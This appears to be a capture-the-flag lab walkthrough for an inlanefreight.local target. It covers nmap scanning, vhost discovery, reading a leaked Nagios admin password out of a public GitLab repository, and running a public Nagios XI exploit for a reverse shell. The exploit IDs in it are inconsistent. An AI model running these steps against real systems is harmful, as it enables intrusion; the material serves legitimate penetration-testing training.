# Questions
1. What is the URL of the WordPress instance?
2. What is the name of the public Gitlab project?
3. What is the FQDN of the third VHOST?
4. What application is running on the third VHOST?
5. What is the admin password to access this application?
6. Obtain reverse shell access on the target and submit the contents of the flag.txt file.

# Walkthrough
Give the Vhost of `gitlab.inlanefreight.local`

Adding that to the `etc/hosts/`
Running `sudo nmap -sC -sV -v 10.129.201.90`
```bash
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
25/tcp   open  smtp     Postfix smtpd
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://gitlab.inlanefreight.local:8180/
|_http-server-header: Apache/2.4.41 (Ubuntu)
389/tcp  open  ldap     OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
8180/tcp open  http     nginx
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 54 disallowed entries (15 shown)
| / /autocomplete/users /autocomplete/projects /search 
| /admin /profile /dashboard /users /help /s/ /-/profile /-/ide/ 
|_/*/new /*/edit /*/raw
Service Info: Host:  skills2; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

First doing a `curl -k http://10.129.201.90 | grep`, gave me the url of the Wordpress.

Next, going to `http//gitlab.inlanefreight.local/explore`, was able to find the public repo.

Going through the repo there is a website called `monitoring.inlanefreight.local`. Adding it the `/etc/hosts`, I can visit and this seems to be the 3rd Vhost I need.

For the 4th question it says the website is powered by `nagios`. Which seems to be the answer.

For the 5th, making an account and going to the repo of the user, I was able to access other projects the company has worked on.
``postgres=# CREATE USER nagiosadmin WITH PASSWORD 'oilaKglm7M09@CPL&^lC';``
From there I have access to the Niagos webpage.

Going for the RCE.
```bash
searchsploit nagios XI 5.7.5
searchsploit -p 49449 

# Getting the exploit through the url and running it in python.
python3 49422.py http://monitoring.inlanefreight.local nagiosadmin 'oilaKglm7M09@CPL&^lC' 10.10.14.3 1234
```